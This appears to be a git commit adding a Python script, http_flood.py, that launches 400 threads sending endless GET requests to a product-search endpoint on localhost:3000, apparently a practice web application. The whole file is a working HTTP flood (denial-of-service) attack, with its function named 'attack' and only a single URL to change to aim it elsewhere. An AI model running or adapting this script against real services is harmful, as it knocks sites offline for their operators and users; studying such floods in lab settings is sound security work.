cd7038a9209a5d74f369ea53077dab2dacd1f13a
Kacper Śniadek <67651085+cialoo@users.noreply.github.com>
2026-05-12 22:33:52 +0200

    Add files via upload

---
+++ http_flood.py
@@ -0,0 +1,22 @@
+import requests
+import threading
+import time
+
+url = 'http://localhost:3000/rest/products/search?q='
+count = 400
+
+def attack():
+    while True:
+        try:
+            request = requests.get(url, timeout=1)
+            print(request.status_code)
+        except:
+            print("Serwer starting down")
+
+for i in range(count):
+    t = threading.Thread(target=attack)
+    t.daemon = True
+    t.start()
+
+while True:
+    time.sleep(1)
